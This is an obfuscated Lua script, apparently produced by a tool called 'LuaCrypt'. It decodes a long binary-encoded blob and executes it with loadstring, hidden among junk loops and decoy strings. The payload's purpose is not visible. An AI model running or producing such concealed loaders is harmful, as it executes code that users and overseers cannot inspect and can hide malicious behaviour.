getfenv().getf3nv = true ,nil,nil;return(function(...) local Trust_Me_Bro = "LuaCrypt is good, Trust me bro." local n_z__xIx = {x____f__ = {px_l_p__ = table.concat},I_xe_x__ = {_l_qfz__ = loadstring},_z__f_qe = {xx__pfle = tonumber},fIqx_e__ = {_z_Iln__ = string.char},z___z__q = { _Ip___qp = setmetatable}, ____nxn_ = { ll__x___ = nil} } local fx__zIl_ = n_z__xIx.x____f__.px_l_p__ local x_xzl_pq = n_z__xIx.I_xe_x__._l_qfz__ local __qve_p_ = n_z__xIx._z__f_qe.xx__pfle local _q_x_eqn = n_z__xIx.fIqx_e__._z_Iln__ local vfvx_f__ = n_z__xIx.z___z__q._Ip___qp local n_ez___z = n_z__xIx.____nxn_.ll__x___ local __q_n_xf = _q_x_eqn(108, 111, 97, 100, 115, 116, 114, 105, 110, 103) local __eel__x = fx__zIl_({'022324192453155422027332154479123359033427055469','064639195376174223056474146663159795156777127699','037545196596136467092772037437023454065533144599','099562199297157627052223049964179563026345093996','024759124632175367153465022795075735145634164535','037434159962135532177529027329175342093447026536','097745125452139529127966037376039763167635075532','095222129692145737036927122396094293073452126357','096942143566134775074346172432159274146646044347','097792197627135493047962039645125227154962174334','022652053224156252059947159669062753056924065336','066742173922123243099536022347153224126375159669','047965179276153936097227095979053292094269169964','059776153266144935092546153495139644059567145364','034766139955163644066959077677147729064426127547','059257053432194694152264153744095972149659022445','066392195763023922055536145922042996043995024629','092334173447136659174564029247166929042579025327','026446123995195673165753062742192246046796054576','095493194993195374122735039274079333075694057933','042659157963045649022555044964176252124994165665','039326159656136267046974036976195332034797142537','059752177356169497125376057355159242052297095522','079545036972145427055244196425079943099962052559','064274042773123537045363034642027772197469075536','064537197762127926057934132755046477056276029432','049964149599196454173345037292173222042365092542','096346136244147977145456062947137956036455066524','064746192569145479127479036542092543092544074773','092232169225166957163347059333064349175635124946','067466052647157773199335156367052775173265049975','059922069654175959072494134349152747124439136623','044553033297147553095595125925174595195737143377','022399164925175256134493067643044676162796056599','027264174569167224075475027366053549054753197949','059663197594124529144554059964196596143929159265','097547036299153599043455135344167743175754056735','056997135469169957055674075275154742134944176373','022652167722175325033472163472024952057772126993','024923124234142767125655066274197273077542047629','053754194775145243033935156554069336096275052329','035639155224176422194347044346176242092362122464','079493173639129324069723054235023476127936049739','095727132324176932169424097627154647024296144342','037664159772159249164632024472045656133292122995','062394136559123645024922093922192946036646174643','079235177273169343132749037354046734153327049433','025346176643154737095654073246067542144329173737','076646196993122774074267177636177695197737134695','054796132374157777035626133534137997156939099676','063753135326139754199942074673159736042645074656','022933147566152536025269095247177269025266167434','032444172434159739062952137497172247129595062357','022353192443146244125457056929176655063997042662','062922029473135353055497127753145795159957045994','064734142644127496022332037656075634135357162975','022464123932126669096444123233156946127627195564','025496127923155973079692196754143732057347145735','026529069327134376033736145549153762142647147974','072964199435096266142253177765026277079394162469','092975162353076253162932167246097743132379049363','076679154495092374197649163769052225094464047379','043742123742046922075399155397126459174273163466','063639152592062925196952053656176475146245122455','053397165974037397042945135467167439162753029357','025273156235067362064634092952157793055579174543','032665156645076427053969043676139423077679049945','063492097526195533097225139476194625146934166647','094937164399136359052967147932145436037343097976','034677133259197266096344127796026339037559123377','079635156744177755045547099762092565165562056954','097524139322179342122459029663074963153274079692','076542133255153265027952037332039244042245155456','077364157742149949194544057295079743163575065564','066949132393196975127296137462025694099963195292','025392092466163937046339197265179624166299029675','022442123253196666063442167735165432153597044275','072257147932196364062536066497129276027457149729','065926132999136333192724057999159469149746132665','064642036227162772044352195966153765167323155963','025424157662147937157264036592047336122659096475','026297193723146277097333035945193225042635195472','079749152656146939073792066736152962132357093724','044247134295145965165453057479046299153624122972','096553045977165272027293122939197366167336163644','046526136234122422065593149692034224065997067542','032622169575173766093652022624194676074253179772','027337144339136365049262097949074655069992165364','037753149432199937026666054473173653047267072452','066275156325149349137222034347075922199967165935','024657049266153744047252193457149335129627162455','077252156399144674032624152747145529042256197635','053954142457133234046525096939099435095647155779','039249154544147664043246142269037569076476165777','077659145643176269073562165966169639133945066635','093364057356145239073436132346129349165597142292','054767139747024569056337174757167792032526123727','079572164462123672063649024379054594094365124354','067246193744197262057362135675047522099544176997','039922169933175259052246137476137662156437034236','034275136553133229146752049692052573122323127763','057649147633175627039576074367022392175333124265','059737172742162449136546099335077965162527036969','055295175737147449052553139249024363064254127733','032779132279156963173279064456043672034967024675','097473147473127494174546064465125222042494032747','057225053759195554073999045743122467039744134233','095337033259145226196749072767076435192577172243','074472195699046759024465064352036969066363194775','039794029624155692139439056567026362173427153697','049644023479175932093749052925064473162649074556','043399066732197437076255123495023566036235133935','054947092974152757039643124947075959023955154629','045722047432146693065677174349062776096224076629','094546047592179769072333173426064594077692173466'}) local function _I__x_vq(l__xI___) return function() return l__xI___ end end local function ___z_f_z(__n_x__I) return _I__x_vq(__n_x__I)() end local function _e__qnx_() return ___z_f_z(math.random(100, 999)) end local function _z_xI__p(f_x____n) local function ex_x_f_e(_ex_eI_n) return _q_x_eqn(__qve_p_(_ex_eI_n, 2)) end _e__qnx_() local vfzxqx_q = f_x____n:gsub("[^01]", "") return vfzxqx_q:gsub("(".. ("[01]"):rep(8) .. ")", ex_x_f_e) end local function __xn__z_(v__z__I_) local _______q, __ff__xq, xfv___l_, n__q____ = "l", "o", "a", "d" local ll_e___z, nnn_v_px, v_xf_fIz, x_qe___v = "s", "t", "r", "i" local _I_xx_vx, _e_x_p__ = "n", "g" local function _zz____x(...) local __pq__q_, _x_____q = {...}, "" for i = 1, #__pq__q_ do _x_____q = _x_____q .. __pq__q_[i] end return _x_____q end local znq_Ix__ = _zz____x(_______q, __ff__xq, xfv___l_, n__q____, ll_e___z, nnn_v_px, v_xf_fIz, x_qe___v, _I_xx_vx, _e_x_p__) local qxe__q__ = ("%s"):format(znq_Ix__) local ______ef, q__nfene = pcall(x_xzl_pq(v__z__I_)) local __l____v, elvpx_p_, n_____p_ = "F___W_DW_S_FW_Z_SW_G__R_FF_WD______FW__FG_W_FQ_G_Z", "QF___R__G___W________DX__X___G_____D____W_RZ__V_FW", "____S__DSWS___ZW__FFZ___F_DSDF__ZG___SXGFQXZ_____F" local _xxlp___ = (2 * 5 / 10 + 3 - 3) ^ 1 if not ______ef then local f_vf__qI = { __l____v, elvpx_p_, n_____p_, _xxlp___ } for i = 1, # f_vf__qI do f_vf__qI[i] = f_vf__qI[i] .. "_extra" end end return q__nfene end local _z_qp__I = _z_xI__p(__eel__x) _e__qnx_() local function x___xx__(x) local _0, _1, _2 = print, warn, error local x__xnfn_ = { [1] = _0, [2] = _1, [3] = _2, ["x"] = x } for i = 1, #x__xnfn_ do if x__xnfn_[i] and x__xnfn_["x"] == x__xnfn_[i] then return ((function(...) return ... end)()) end end end x___xx__(x_xzl_pq) local l_lvlx__ = vfvx_f__( { _Iv_p_lx = { l___e___ = { _l_qq__I, __xp__zx, qf__l___ }, lz_z_xxn = function() for x__zn_x_ = 1, 50 do local _qvxn__p = x__zn_x_ * 2 local f_z_x_x_ = {x__zn_x_, x__zn_x_ * 10, x__zn_x_ * 100} end return n_z__xIx.____nxn_.ll__x___ end }, v_I_xIxI = { [true] = { function() for __x_x_vl = 1, 100 do local pe___fx_ = __x_x_vl * __x_x_vl if pe___fx_ > 100 then break end end end }, [false] = { { function() return false end }, function() for _____fnI = 1, 10 do local ez_lp_e_ = _____fnI * 2 end end } } }, { __index = function(_, eI_zx___) local p_nvpze_ = "Lua Crypt1" if eI_zx___ == "print" then for ln____x_ = 1, 100 do local qxz_e__n = ln____x_ * ln____x_ + ln____x_ end return print elseif eI_zx___ == "warn" then for v_ex_xqf = 1, 50 do local _n__ne_e = v_ex_xqf * 3 if _n__ne_e == 150 then return warn end end end return n_z__xIx.____nxn_.ll__x___ end } ) __xn__z_(_z_qp__I, n_z__xIx.____nxn_.ll__x___, [[____]], l_lvlx__); local _z_nnf__ = function(hex) return _q_x_eqn(__qve_p_(hex:sub(3), 16)) end local n___zz__ = { '0x02','0x15','0x9c','0xc7','0xea','0xbe','0x03','0x7f','0xed','0xf3','0x2a','0x97','0x80','0xc3','0x6d','0xbb','0x82','0xe9','0xe1','0x33','0xe7','0x56','0x46','0x1c','0x73','0x65','0x82','0xd2','0x55','0x89','0x99','0x6f','0x65','0xf9','0xee','0x46','0x59','0x94','0x2c','0xcc','0xeb','0xd3','0x38','0xa8','0xde','0x3a','0x22','0x71','0x0d','0x79','0x98','0xee','0xb6','0xcc','0xf0','0x18','0x89','0x94','0xa5','0xa9','0x67','0x0f','0x82','0xb8','0xaa','0x01','0x1c','0x47','0x5e','0x78','0x8d','0xa0','0xe8','0x0d','0xe8','0xf9','0xa8','0xbc','0x8b','0x28','0x53','0x9b','0x5a','0xe0','0xec','0x0d','0x07','0xa1','0x42','0x40','0x47','0xda','0xc3','0x9f','0xab','0x6b','0xc4','0x6c','0x2c','0x6c','0x65','0x22','0xad','0xde','0x23','0x2d','0xf1','0x55','0xbc','0x4c','0x9c','0x5a','0x70','0x00','0xfe' } for i = 1, # n___zz__ do _z_nnf__(n___zz__[i]) end end)(...)
